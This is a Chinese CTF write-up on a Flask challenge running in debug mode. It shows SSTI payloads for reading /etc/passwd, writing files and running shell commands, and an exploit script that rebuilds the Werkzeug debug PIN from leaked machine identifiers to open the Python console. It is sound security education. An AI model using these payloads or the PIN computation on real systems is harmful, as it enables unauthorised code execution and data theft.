> 原文链接: https://www.anquanke.com//post/id/197602 


# 从一道ctf题谈谈flask开启debug模式存在的安全问题


                                阅读量   
                                **942957**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



![](https://p0.ssl.qhimg.com/t01c6da05902828bb5b.jpg)



这几天利节前的空闲时间刷了几道buuctf上的题目,遇到一道开启了debug模式的flask[题目](https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret)，发现了这道题目的两种解法，学习了一波flask开启debug模式下存在的安全问题，踩了不少坑，来和大家一起分享一下。



# <a class="reference-link" name="%E9%A2%98%E7%9B%AE"></a>题目

启动靶机，打开页面后就一句提示：”Welcome To Find Secret”：

![](https://p4.ssl.qhimg.com/t015affe8d3b61a3b48.png)

用SourceLeak扫了一下源码，发现除了有一个robots.txt,大片的429(buuctf的特色(๑•ᴗ•๑))，

![](https://p0.ssl.qhimg.com/t0132bfe8b54a4b5df0.png)

看一下robots.txt,只有一句：”It is Android ctf”,个人觉得这个没什么用，不要被它误导了，再看一下cookie，不存在，抓包看下，

![](https://p1.ssl.qhimg.com/t01b3e24e658ddc26f2.png)

基本可以判断是flask，而且python版本也出来了

转了一圈，还是回到主页的提示上来，感觉重点在secret这个词上，在url后加上secret访问，显然secret这个路由是存在的：

![](https://p0.ssl.qhimg.com/t01f5ceef663e538b6f.png)

根据提示，需要我们向这个路由发送secret，然后服务端会对发送过去的数据进行加密，测试如下：

![](https://p4.ssl.qhimg.com/t0157b0475dc37aad07.png)

增大secret数据的长度，结果报错了：

![](https://p1.ssl.qhimg.com/t01316743c76f190c47.png)

做过flask开发的师傅们应该知道，这个页面是flask应用开启了debug模式后运行出错的表现，在较老版本的flask中可以直接在这个页面中打开python控制台运行代码，而在较新版本的flask中要打开python控制台需要输入一个pin码，像下面一样：

![](https://p1.ssl.qhimg.com/t013a17d8b3cc1034c6.png)

pin码会在服务器端运行flask应用时输出，其格式为“xxx-xxx-xxx”，其中x为任意一个数字，也就是说pin有10亿种组合。作为攻击者，我们目前是不知道pin码的，除非你有耐性进行爆破，实际上爆破也是可行的，因为在固定的机器上，pin码是固定的，但我今天当然不是来教大家爆破pin码的。我们先回到报错页面看看能发现什么，在一长串的报错信息，有一处特别引人瞩目：

![](https://p3.ssl.qhimg.com/t01f008850f7f3375fa.png)

从中可以判断两点：1是这个加密功能使用了RC4算法，并且秘钥为”HereIsTreasure”；2是使用了render_template_string，所以可能存在ssti。

首先我们来验证第一点：

对RC4稍有了解的同学应该知道,RC4是一种对称加密算法，那么对密文进行再次加密就可以得到原来的明文，我们刚刚提交secret=1是返回了d，那么如果我们提价secret=d是否也会返回1呢，通过验证，确实是这样：

![](https://p0.ssl.qhimg.com/t01adc9bd84de044cbd.png)

那么我们就可以任意伪造解密后的明文，借助工具cyberchef，结合第二点判断，我们伪造一个解密后明文为：”`{``{` config `}``}`”的密文，

![](https://p1.ssl.qhimg.com/t011b0c5c256a2b6aaa.png)

然后把密文提交到secret，反馈如下：

![](https://p1.ssl.qhimg.com/t01817eb74a1a319174.png)

简直是完美的ssti，到这里，题目基本做了一半，接下来有两条路，一是继续使用常规ssti思路；二是尝试获取pin码来打开python shell。起初我想走第二条路，但试了多次后算出的pin码都不成功，无奈之下只能先走常规ssti思路，即解法一。



## 解法1：常规ssti

我常用的python2 ssti的payload有以下这些：

1.读文件

``{``{` ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() `}``}``

2.写文件

``{``{` ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1','w').write("something")`}``}``

3.代码执行

``{``{` ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evalcode', 'w').write('evalcode') `}``}``<br>``{``{` config.from_pyfile('/tmp/evalcode') `}``}``

如果要获取一条命令的结果，需要分为下面三步：

第一步，写一个含恶意python代码的文件，比如：

``{``{` ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evalcode','w').write("import os;os.system('whoami &gt; /tmp/result');")`}``}``

第二步，执行这个文件，比如：

``{``{` config.from_pyfile('/tmp/evalcode') `}``}``

执行完毕后，恶意代码的结果就写到了/tmp/result文件中，所以第三步读取该文件的内容：

第三步：

``{``{` ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/result').read() `}``}``

在本场景中，只需要将第一步的恶意代码换成`import os;os.system('cat /flag.txt &gt; /tmp/result');`即可获取flag，没有太大难度，所以这里不再细表，不过我想提一句，虽然我用这种方法获取了flag，但可能这不是出题者的本意，注意上面的报错中是出现了过滤flag的代码的：

![](https://p3.ssl.qhimg.com/t01eb0372f221d8fa69.png)

只不过在buuctf的flag中没有ciscn字样所以该过滤没有起到应有的作用。在用这种方法获取flag后，我再次尝试获取pin码，最后成功了，下面重点介绍这种解法。



## 解法2：获取pin码打开python shell

在尝试这种方法之前，我仔细阅读了这两篇文章：

[https://www.cnblogs.com/HacTF/p/8160076.html](https://www.cnblogs.com/HacTF/p/8160076.html)

[https://xz.aliyun.com/t/2553#toc-2](https://xz.aliyun.com/t/2553#toc-2)

大佬的文章给了我很大帮助，但参照文中的payload计算的pin码却始终不对，于是我在本地搭建了flask环境，在一步步调试中找出来问题所在，最后算出了正确的pin码，来看一下我的过程吧。

首先在本地搭建flask环境，和题目一样，我用的的python版本为2.7，下面是app.py的源码：

```
import pdb
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello():
    return Hello

if __name__ == "__main__":
    pdb.set_trace()
    app.run(host="0.0.0.0",port=80,debug=True)
```

在其中加入了pdb调试语句，这样在进入app.run()语句之前程序会暂停等待调试指令，

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

根据[HacTF师傅文章](https://www.cnblogs.com/HacTF/p/8160076.html)中的提示，逐步调试找到了生成pin码的关键函数get_pin_and_cookie_name(),其源码如下：

```
def get_pin_and_cookie_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdigit():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", app.__class__.__module__)

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username, 
        modname, 
        getattr(app, "__name__", app.__class__.__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]


    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

最后返回的rv即最终输出的pin码，用于生成pin的关键代码在其中的52~59行，这部分代码利用了probably_public_bits和private_bits两个参数来参与hash运算，这两个参数是两个列表，分别由这些元素组成：

```
probably_public_bits = [
        username, #root
        modname,  #flask.app
        getattr(app, "__name__", app.__class__.__name__), #Flask
        getattr(mod, "__file__", None), #/usr/local/lib/python2.7/dist-packages/flask/app.pyc
    ]

private_bits = [str(uuid.getnode()), get_machine_id()]
```

其中username是服务器运行flask所登录的用户名，在我本地测试机上是root

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

modname一般不变就是flask.app

![](https://p5.ssl.qhimg.com/t01d320485aee598b19.png)

`getattr(app, "__name__", app.__class__.__name__)` 的结果就是Flask，也不会变

![](https://p5.ssl.qhimg.com/t0119de98861e2419a2.png)

`getattr(mod, "__file__", None)`的值是第一个坑点，我调试的结果是’/usr/local/lib/python2.7/dist-packages/flask/app.pyc’,与[kingkk师傅的文章](https://xz.aliyun.com/t/2553#toc-2)不一致,也许是因为他的环境是python3，在他那里这个值是flask目录下的app.py的绝对路径，而我的环境是python2，其值为flask目录下的app.pyc的绝对路径

在来看`str(uuid.getnode())`,其值为服务器mac地址的十进制值，服务器的mac地址除了使用ifconfig来查看，还可以`cat /sys/class/net/eth0/address`来查看，需要注意的是其中的eth0为网卡接口的名称，多网卡机器可能会有eth1、eth2等，还有些机器的网卡名称是ens33这样的，获取后将其用windows上的计算器程序转换为10进制就是`str(uuid.getnode())`的值,例如我本地环境的网卡地址如下：

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

输入到计算器转回十进制:

![](https://p5.ssl.qhimg.com/t0189a4ebf1c273aef7.png)

其值和调试器中获得的是一样的：

![](https://p4.ssl.qhimg.com/t015cb3b0eadaf67ec5.png)

最后是`get_machine_id()`的值，这是第二个大坑点，可能是flask版本更新的原因，`get_machine_id()`的源码已经和两位师傅文中的不同了，来看下该函数的源码：

```
def get_machine_id():
    global _machine_id
    rv = _machine_id
    if rv is not None:
        return rv

    def _generate():
        # docker containers share the same machine id, get the
        # container id instead
        try:
            with open("/proc/self/cgroup") as f:
                value = f.readline()
        except IOError:
            pass
        else:
            value = value.strip().partition("/docker/")[2]

            if value:
                return value

        # Potential sources of secret information on linux.  The machine-id
        # is stable across boots, the boot id is not
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    return f.readline().strip()
            except IOError:
                continue

        # On OS X we can use the computer's serial number assuming that
        # ioreg exists and can spit out that information.
        try:
            # Also catch import errors: subprocess may not be available, e.g.
            # Google App Engine
            # See https://github.com/pallets/werkzeug/issues/925
            from subprocess import Popen, PIPE

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = &lt;([^&gt;]+)', dump)
            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows we can use winreg to get the machine guid
        wr = None
        try:
            import winreg as wr
        except ImportError:
            try:
                import _winreg as wr
            except ImportError:
                pass
        if wr is not None:
            try:
                with wr.OpenKey(
                    wr.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\Microsoft\Cryptography",
                    0,
                    wr.KEY_READ | wr.KEY_WOW64_64KEY,
                ) as rk:
                    machineGuid, wrType = wr.QueryValueEx(rk, "MachineGuid")
                    if wrType == wr.REG_SZ:
                        return machineGuid.encode("utf-8")
                    else:
                        return machineGuid
            except WindowsError:
                pass

    _machine_id = rv = _generate()
    return rv
```

与师傅们的文章的区别在第10~19行，首先尝试打开/proc/self/cgroup文件，读取第一行，并将/docker/字符串后面的内容作为该函数的返回值，如果该文件不存在或者该值不存在，才会走入师傅们文章中提到的依次尝试读取”/etc/machine-id”, “/proc/sys/kernel/random/boot_id”两个文件的流程。在我的本地环境中，/proc/self/cgroup文件是这样的：

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

可见第一行没有/docker这个字符串，那么走入下面的流程，尝试读取/etc/machine-id

![](https://p4.ssl.qhimg.com/t019db3212146cc3b8e.png)

其值存在，那么返回这个值，至此，我们用于计算pin码的所有变量已经获得，就可以计算PIN码了，这里直接借用一下kingkk师傅的exp：

```
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
    '274973438824773',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'f855a4d03e8442aa92d2813dfc0bf8c3'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

计算得出的pin码

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

再看flask运行后的pin码：

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

Success！

那么尝试来获取该题目的pin码，依然需要获取6个变量，首先是用户名，我采用的办法是读取/proc/self/environ环境变量的办法，加密生成读取文件的payload：

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

secret提交：

![](https://p0.ssl.qhimg.com/t01f1d7f8dd90bee461.png)

可见username的值为glzjin

然后是modname，依然为flask.app

第三个值`getattr(app, "__name__", app.__class__.__name__)`依然为Flask

第四个值`getattr(mod, "__file__", None)`要注意，服务器上python2的安装路径和我们本地的可不太一样，这可以从报错信息中看出：

![](https://p4.ssl.qhimg.com/t01c01916a90a8f0acb.png)

所以我们这里根据上面本地测试的结果依葫芦画瓢，猜测这个值应该为’/usr/local/lib/python2.7/site-packages/flask/app.pyc’<br>
随后是str(uuid.getnode())的值，读取服务器的/sys/class/net/eth0/address文件，其结果为：

![](https://p0.ssl.qhimg.com/t01c8b445bbaba09d25.png)

转化为10进制值为2485410360647

最后是get_machine_id()的返回值，依照上面的处理逻辑，我们需要先判断一下服务器上是否存在/proc/self/cgroup文件，可以看到该文件不仅存在，而且第一行有/docker/字符串：

![](https://p1.ssl.qhimg.com/t0141ce82a4c0a3115f.png)

那么它的get_machine_id()的返回值就应该是第一行/docker/后面的那部分，即

dc583dd8c4ccf506f4f6052497cd575040887d6c22b7f25edd6d4f19d05be18e

至此，所有参数获取完毕，输入payload计算pin码：

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

在报错页面中输入pin码，成功打开python shell

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

然后就可以为所欲为了，例如获得flag：

![](https://p1.ssl.qhimg.com/t0159d6ec79ba5f1e7f.png)



## 总结

这次做题给我的经验可以用一句古诗来总结：纸上得来终觉浅，绝知此事要躬行。做安全不能只停留在读懂别人的paper，更不能只会用现成的exp，而是要加强实践动手能力，提高代码分析能力，否则目标环境稍有变化就会不知所措。
